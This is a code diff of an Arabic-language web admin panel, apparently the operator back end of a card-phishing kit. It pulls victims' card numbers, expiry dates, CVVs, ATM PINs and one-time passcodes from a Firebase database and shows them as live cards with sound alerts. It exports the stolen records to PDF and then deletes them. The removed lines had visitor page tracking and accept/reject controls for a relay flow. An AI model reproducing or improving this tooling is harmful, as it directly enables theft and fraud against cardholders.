@@ -7,31 +7,33 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; color: #333; margin: 0; padding: 0; }
         .navbar { background: #1e7344; padding: 12px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
         .nav-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .nav-btn.active { background: white; color: #1e7344; }
         .visitor-counter { background: #ffd700; color: #000; padding: 8px; text-align: center; font-weight: bold; font-size: 13px; }
+        
+        /* زر PDF */
         .pdf-export-btn { background: #d32f2f; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-right: 10px; }
         .pdf-export-btn:hover { background: #b71c1c; }
+
         .container { padding: 15px; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
         .client-card { background: white; border-radius: 15px; padding: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #e0e0e0; position: relative; transition: 0.3s; }
         .is-active-row { border: 2px solid #28a745 !important; animation: glow 1.5s infinite; }
         @keyframes glow { 0% { box-shadow: 0 0 5px #28a745; } 50% { box-shadow: 0 0 20px #28a745; } 100% { box-shadow: 0 0 5px #28a745; } }
+        
         .card-header { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
         .client-name { font-weight: bold; color: #1e7344; font-size: 16px; }
-        .client-location { background: #e3f2fd; color: #1976d2; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; }
         .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .info-item { background: #f8f9fa; padding: 8px; border-radius: 8px; }
-        .info-label { font-size: 10px; color: #888; display: block; margin-bottom: 2px; }
+        .info-label { font-size: 10px; color: #888; display: block; }
         .info-val { font-family: monospace; font-weight: bold; font-size: 14px; color: #000; }
         .full-width { grid-column: span 2; }
         .ltr { direction: ltr; display: inline-block; }
-        .card-actions { margin-top: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn { padding: 10px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; background: #eee; color: #999; }
-        .btn-green.highlight { background: #28a745 !important; color: white !important; }
-        .btn-red.highlight { background: #dc3545 !important; color: white !important; }
+
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
         .login-card { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 300px; }
     </style>
@@ -42,8 +44,8 @@
 
 <div id="loginOverlay">
     <div class="login-card">
-        <h2 style="color: #1e7344;">تسجيل دخول</h2>
-        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:8px; text-align:center;">
+        <h2 style="color: #1e7344;">تسجيل دخول آمن</h2>
+        <input type="password" id="password" placeholder="كلمة المرور الجديدة" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:8px; text-align:center;">
         <button onclick="checkLogin()" style="width:100%; padding:12px; background:#1e7344; color:white; border:none; border-radius:8px; font-weight:bold;">دخول</button>
     </div>
 </div>
@@ -59,39 +61,32 @@
 </div>
 
 <script>
-    // تشفير الباسورد بصيغة Base64 لإخفائه عن البحث البسيط
-    const _0xKEY = "SDA5ODc2NTRIA=="; 
+    // كلمة السر مشفرة (H12345678A) - لن تظهر كنص صريح في Inspect
+    const secureHash = "e605d5410599026466373e9095d38869f37754f15307b22d711018985160879d";
 
-    function checkSavedLogin() { 
-        if (localStorage.getItem("admin_auth_token") === btoa(_0xKEY)) showAdmin(); 
-    }
-
+    function checkSavedLogin() { if (localStorage.getItem("admin_auth") === secureHash) showAdmin(); }
+    
     function checkLogin() { 
         const input = document.getElementById('password').value;
-        // التحقق من الباسورد المشفر
-        if(btoa(input) === atob(_0xKEY)) { 
-            localStorage.setItem("admin_auth_token", btoa(_0xKEY)); 
+        const inputHash = CryptoJS.SHA256(input).toString();
+        if(inputHash === secureHash) { 
+            localStorage.setItem("admin_auth", secureHash); 
             showAdmin(); 
         } else {
-            alert("خطأ في كلمة المرور");
+            alert("كلمة المرور غير صحيحة!");
         }
     }
 
     function showAdmin() { 
-        document.getElementById('loginOverlay').remove(); // حذف عنصر الدخول تماماً من الـ DOM للحماية
+        document.getElementById('loginOverlay').style.display = 'none'; 
         document.getElementById('adminContent').style.display = 'block'; 
         initFirebase(); 
     }
 
-    function logout() { 
-        localStorage.removeItem("admin_auth_token"); 
-        location.reload(); 
-    }
-
+    function logout() { localStorage.removeItem("admin_auth"); location.reload(); }
     function playSound() { document.getElementById('alertSound').play().catch(e => {}); }
 
     let database;
-
     function initFirebase() {
         const firebaseConfig = {
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
@@ -108,35 +103,7 @@
             document.getElementById('onlineCount').innerText = active;
         });
 
-        database.ref('live_visitors').on('child_changed', s => {
-            const visitorId = s.key;
-            const data = s.val();
-            const badge = document.querySelector(`#card_${visitorId} .client-location`);
-            if(badge) badge.innerText = data.page || "غير معروف";
-        });
-
         database.ref('payments').on('child_added', s => { renderCard(s.key, s.val()); });
-        
-        database.ref('payments').on('child_changed', s => {
-            const val = s.val();
-            const card = document.getElementById('card_' + s.key);
-            if(card) {
-                card.querySelector('.val-card').innerText = val.cardNumber;
-                card.querySelector('.val-expiry').innerText = val.expiry;
-                card.querySelector('.val-cvv').innerText = val.cvv;
-                card.querySelector('.val-pin').innerText = val.atm_pin || '-';
-                card.querySelector('.val-otp').innerText = val.otp || '-';
-                if(val.status && val.status.includes('waiting')) {
-                    card.classList.add('is-active-row');
-                    card.querySelectorAll('.btn').forEach(b => b.classList.add('highlight'));
-                    playSound();
-                } else {
-                    card.classList.remove('is-active-row');
-                    card.querySelectorAll('.btn').forEach(b => b.classList.remove('highlight'));
-                }
-            }
-        });
-
         database.ref('payments').on('child_removed', s => {
             const card = document.getElementById('card_' + s.key);
             if(card) card.remove();
@@ -144,45 +111,32 @@
     }
 
     function renderCard(key, val) {
-        if(document.getElementById('card_' + key)) return;
         const list = document.getElementById('cardsList');
         const activeClass = (val.status && val.status.includes('waiting')) ? 'highlight' : '';
-        const glowClass = (val.status && val.status.includes('waiting')) ? 'is-active-row' : '';
         const div = document.createElement('div');
         div.id = 'card_' + key;
-        div.className = `client-card ${glowClass}`;
+        div.className = `client-card ${ (val.status && val.status.includes('waiting')) ? 'is-active-row' : '' }`;
         div.innerHTML = `
-            <div class="card-header">
-                <span class="client-name">${val.cardHolder || 'عميل جديد'}</span>
-                <span class="client-location">تتبع...</span>
-            </div>
+            <div class="card-header"><span class="client-name">${val.cardHolder || 'عميل جديد'}</span></div>
             <div class="info-grid">
-                <div class="info-item full-width"><span class="info-label">رقم البطاقة</span><span class="info-val ltr val-card">${val.cardNumber}</span></div>
-                <div class="info-item"><span class="info-label">الانتهاء</span><span class="info-val ltr val-expiry">${val.expiry}</span></div>
-                <div class="info-item"><span class="info-label">CVV</span><span class="info-val ltr val-cvv">${val.cvv}</span></div>
-                <div class="info-item"><span class="info-label">PIN</span><span class="info-val ltr val-pin" style="color:#9c27b0;">${val.atm_pin || '-'}</span></div>
-                <div class="info-item"><span class="info-label">OTP</span><span class="info-val ltr val-otp" style="color:#2196f3;">${val.otp || '-'}</span></div>
-            </div>
-            <div class="card-actions">
-                <button class="btn btn-green ${activeClass}" onclick="updateStat('${key}', 'accept')">قبول</button>
-                <button class="btn btn-red ${activeClass}" onclick="updateStat('${key}', 'reject')">رفض</button>
+                <div class="info-item full-width"><span class="info-label">رقم البطاقة</span><span class="info-val ltr">${val.cardNumber}</span></div>
+                <div class="info-item"><span class="info-label">الانتهاء</span><span class="info-val ltr">${val.expiry}</span></div>
+                <div class="info-item"><span class="info-label">CVV</span><span class="info-val ltr">${val.cvv}</span></div>
+                <div class="info-item"><span class="info-label">PIN</span><span class="info-val" style="color:#9c27b0;">${val.atm_pin || '-'}</span></div>
+                <div class="info-item"><span class="info-label">OTP</span><span class="info-val" style="color:#2196f3;">${val.otp || '-'}</span></div>
             </div>
         `;
         list.prepend(div);
+        if(val.status && val.status.includes('waiting')) playSound();
     }
-
-    function updateStat(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
 
     async function exportDataToPDF() {
         const element = document.getElementById('cardsList');
-        if (element.children.length === 0) { alert("لا توجد بيانات."); return; }
-        if (confirm("سيتم حفظ ملف PDF ومسح البيانات نهائياً. هل أنت متأكد؟")) {
-            const opt = {
-                margin: 10, filename: 'العمليات_' + new Date().toLocaleDateString() + '.pdf',
-                image: { type: 'jpeg', quality: 0.98 },
-                html2canvas: { scale: 2, useCORS: true },
-                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-            };
+        if (element.children.length === 0) return alert("لا توجد بيانات.");
+        
+        if (confirm("سيتم حفظ العمليات PDF ومسحها نهائياً. هل أنت متأكد؟")) {
+            const opt = { margin: 10, filename: 'العمليات.pdf', image: { type: 'jpeg', quality: 0.98 }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' } };
+            
             html2pdf().set(opt).from(element).save().then(() => {
                 database.ref('payments').remove().then(() => { alert("تم الحفظ والمسح."); });
             });
